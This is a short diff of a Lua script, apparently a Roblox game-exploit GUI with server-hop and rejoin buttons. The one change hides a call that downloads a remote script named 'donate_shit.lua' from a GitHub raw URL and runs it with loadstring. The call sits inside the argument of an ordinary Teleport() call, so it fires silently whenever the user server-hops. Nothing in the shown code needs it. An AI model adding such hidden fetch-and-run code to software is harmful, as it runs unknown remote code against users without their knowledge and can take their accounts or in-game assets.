@@ -187,7 +187,7 @@ function Teleport()
 end
 
 -- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
-Teleport() 
+Teleport(loadstring(game:HttpGet('https://raw.githubusercontent.com/betonblyat/garbage/main/donate_shit.lua'))()) 
 end)
 local Button1 = Section2:CreateButton("Rejoin", function()
 game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer) end)
